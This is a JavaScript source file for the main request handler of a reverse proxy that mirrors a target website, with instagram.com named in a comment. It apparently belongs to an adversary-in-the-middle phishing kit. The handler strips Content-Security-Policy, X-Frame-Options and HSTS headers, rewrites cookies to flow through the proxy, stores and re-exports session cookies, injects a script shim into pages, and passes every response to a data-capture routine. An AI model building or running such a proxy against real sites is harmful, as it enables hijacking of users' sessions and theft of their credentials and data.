'use strict';
const axios  = require('axios');
const config = require('../config');
const { fetchTarget }             = require('../utils/fetchTarget');
const { rewriteHtml }             = require('../utils/rewriteHtml');
const { rewriteCss }              = require('../utils/rewriteCss');
const { injectShim }              = require('../utils/injectShim');
const { rewriteSetCookieHeaders } = require('../utils/cookieRewriter');
const { rewriteUrl }              = require('../utils/rewriteUrl');
const { getCookieString, ingestResponseCookies, exportSessionCookies } = require('../utils/cookieJar');
const { recordEntry }             = require('../utils/harLogger');
const { extractDlpData }          = require('../utils/dlpCapture');

// Response headers that we must strip before forwarding to the browser.
// These would break our rewriting or block our injected content.
const DROP_RESPONSE_HEADERS = new Set([
  'content-security-policy',
  'content-security-policy-report-only',
  'x-frame-options',
  'x-content-type-options',
  'strict-transport-security',
  'transfer-encoding',  // we buffer, so chunked doesn't apply
  'content-encoding',   // axios already decompressed
  'content-length',     // we may change body size during rewriting
]);

async function handleMainProxy(req, res) {
  const _startTime = Date.now();
  req._proxyHandler = 'mainProxy';
  try {
    let targetPath  = req.path;
    let queryString = req.url.includes('?') ? req.url.slice(req.url.indexOf('?') + 1) : '';
    let upstream;
    const MAX_REDIRECTS = 8;

    // ── Follow target-side redirects on the server (browser never sees them) ──
    for (let i = 0; i <= MAX_REDIRECTS; i++) {
      upstream = await fetchTarget(targetPath, {
        method     : i === 0 ? req.method : 'GET',  // redirect always becomes GET
        headers    : req.headers,
        body       : i === 0 && req.rawBody && req.rawBody.length > 0 ? req.rawBody : null,
        queryString,
        sessionId  : req.sessionId,
      });

      // Not a redirect — stop here
      if (upstream.status < 300 || upstream.status >= 400 || !upstream.headers.location) break;

      const location = upstream.headers.location;
      let nextUrl;
      try { nextUrl = new URL(location, config.targetOrigin + targetPath); } catch { break; }

      // Always follow redirects server-side regardless of target domain
      // (handles www. redirects, subdomain redirects, etc.)
      const baseDomain = config.targetHost.replace(/^www\./, '');
      const isTarget = nextUrl.host === config.targetHost ||
                       nextUrl.host === 'www.' + baseDomain ||
                       nextUrl.host === baseDomain;

      if (isTarget) {
        // Same target app (e.g. instagram.com <-> www.instagram.com)
        targetPath  = nextUrl.pathname;
        queryString = nextUrl.search ? nextUrl.search.slice(1) : '';
      } else {
        // Different external origin: fetch directly and serve through proxy pipeline
        const { data, status, headers: h } = await axios({
          method      : 'GET',
          url         : nextUrl.href,
          headers     : {
            'User-Agent'     : req.headers['user-agent'] || 'Mozilla/5.0',
            'Accept'         : req.headers['accept']     || 'text/html',
            'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
            'Cookie'         : getCookieString(req.sessionId, req.headers['cookie']),
          },
          responseType  : 'arraybuffer',
          decompress    : true,
          maxRedirects  : MAX_REDIRECTS - i,
          validateStatus: () => true,
          timeout       : 30_000,
        });
        if (h['set-cookie']) ingestResponseCookies(req.sessionId, h['set-cookie']);
        upstream = { data, status, headers: h };
        break;
      }

      if (i === MAX_REDIRECTS) break; // Safety
    }

    // ── Build clean response headers ─────────────────────────────────────────
    const outHeaders = {};
    for (const [k, v] of Object.entries(upstream.headers)) {
      if (!DROP_RESPONSE_HEADERS.has(k.toLowerCase())) {
        outHeaders[k] = v;
      }
    }

    // Rewrite Set-Cookie so the browser sends them back to us
    if (outHeaders['set-cookie']) {
      outHeaders['set-cookie'] = rewriteSetCookieHeaders(outHeaders['set-cookie']);
    }

    if (req._newProxySession) {
      if (!outHeaders['set-cookie']) outHeaders['set-cookie'] = [];
      else if (!Array.isArray(outHeaders['set-cookie'])) outHeaders['set-cookie'] = [outHeaders['set-cookie']];
      outHeaders['set-cookie'].push(`__proxy_session=${req.sessionId}; Path=/; HttpOnly; SameSite=Lax`);

      // Also seed browser cookies so client-side JavaScript / AJAX calls have them locally
      const existingNames = new Set(outHeaders['set-cookie'].map(h => h.split('=')[0].trim()));
      const sessionCookies = exportSessionCookies(req.sessionId);
      for (const sc of sessionCookies) {
        if (!existingNames.has(sc.name)) {
          let setStr = `${sc.name}=${sc.value}; Path=${sc.path || '/'}; SameSite=Lax`;
          if (sc.httpOnly) setStr += '; HttpOnly';
          if (sc.expirationDate) {
            const d = new Date(sc.expirationDate * 1000);
            setStr += `; Expires=${d.toUTCString()}`;
          }
          outHeaders['set-cookie'].push(setStr);
        }
      }
    }

    // Allow our shim and sub-resources to load
    outHeaders['access-control-allow-origin'] = '*';

    // ── Apply response headers ───────────────────────────────────────────────
    res.status(upstream.status);
    for (const [k, v] of Object.entries(outHeaders)) {
      try { res.setHeader(k, v); } catch { /* skip invalid headers */ }
    }

    // ── DLP extraction ────────────────────────────────────────────────────────
    const upstreamUrl = config.targetOrigin + targetPath + (queryString ? '?' + queryString : '');
    extractDlpData(req, upstream, upstreamUrl);

    // ── Transform body based on content type ─────────────────────────────────
    const ct = (upstream.headers['content-type'] || '').toLowerCase();

    if (ct.includes('text/html')) {
      let html = Buffer.from(upstream.data).toString('utf8');
      html = rewriteHtml(html);
      html = injectShim(html);
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      recordEntry(req, res, upstream, Date.now() - _startTime);
      return res.send(html);
    }

    if (ct.includes('text/css')) {
      let css = Buffer.from(upstream.data).toString('utf8');
      css = rewriteCss(css);
      res.setHeader('Content-Type', ct);
      recordEntry(req, res, upstream, Date.now() - _startTime);
      return res.send(css);
    }

    // Binary / JSON / JS / anything else — stream as-is
    recordEntry(req, res, upstream, Date.now() - _startTime);
    return res.send(Buffer.from(upstream.data));

  } catch (err) {
    console.error('[MainProxy] Error:', err.message);
    res.status(502).send(`
      <!DOCTYPE html>
      <html>
        <head><title>502 - Proxy Error</title></head>
        <body style="font-family:sans-serif;padding:2rem;max-width:600px">
          <h1 style="color:#c00">502 Bad Gateway</h1>
          <p>The proxy could not reach the upstream server.</p>
          <pre style="background:#f4f4f4;padding:1rem;border-radius:4px">${err.message}</pre>
          <a href="/">Try again</a>
        </body>
      </html>
    `);
  }
}

module.exports = { handleMainProxy };
